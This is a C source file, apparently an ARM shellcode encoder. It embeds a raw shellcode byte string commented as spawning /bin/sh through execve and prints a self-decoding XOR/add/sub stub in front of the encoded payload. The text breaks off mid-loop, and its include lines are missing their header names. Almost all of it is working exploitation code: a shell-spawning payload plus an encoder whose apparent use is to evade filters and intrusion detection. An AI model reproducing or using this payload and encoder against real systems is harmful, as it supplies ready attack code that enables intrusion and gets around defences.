#include 
#include 
 
/* execve("/bin/sh", ["/bin/sh"], NULL); */
 
unsigned char your_SC[] = "\x01\x30\x8f\xe2"
                          "\x13\xff\x2f\xe1"
                          "\x78\x46\x0a\x30"
                          "\x01\x90\x01\xa9"
                          "\x92\x1a\x0b\x27"
                          "\x01\xdf\x2f\x2f"
                          "\x62\x69\x6e\x2f"
                          "\x73\x68";
 
 
void syntax(void)
{
    fprintf(stdout,"\nSyntax:  ./encode  \n\n");
    fprintf(stdout,"Type:    -xor\n");
    fprintf(stdout,"         -add\n");
    fprintf(stdout,"         -sub\n\n");
    fprintf(stdout,"Exemple: ./encode -xor 20\n\n");
    exit(1);
}
 
int main(int argc, char *argv[])
{
    if(argc != 3){
        syntax();
        return 1;
        }   
 
 
    if(!strcmp(argv[1], "-xor"))
        {
        fprintf(stdout,"Encode : XOR %s\n", argv[2]);
        fprintf(stdout,"Encoded: \n");
 
        int num  = (256-strlen(your_SC))+1;
        int num2 = num + 1;
 
        fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
                        "\\x16\\xff\\x2f\\xe1"
                        "\\x%.2x\\x40\\xa0\\xe3"
                        "\\x01\\x0c\\x54\\xe3"
                        "\\x1e\\xff\\x2f\\x81"
                        "\\x%.2x\\x40\\x44\\xe2"
                        "\\x04\\x50\\xde\\xe7"
                        "\\x%.2x\\x50\\x25\\xe2"
                        "\\x04\\x50\\xce\\xe7"
                        "\\x%.2x\\x40\\x84\\xe2"
                        "\\xf7\\xff\\xff\\xea"
                        "\\xf5\\xff\\xff\\xeb"
                ,num, num, atoi(argv[2]), num2);
 
        for (int i=0;i
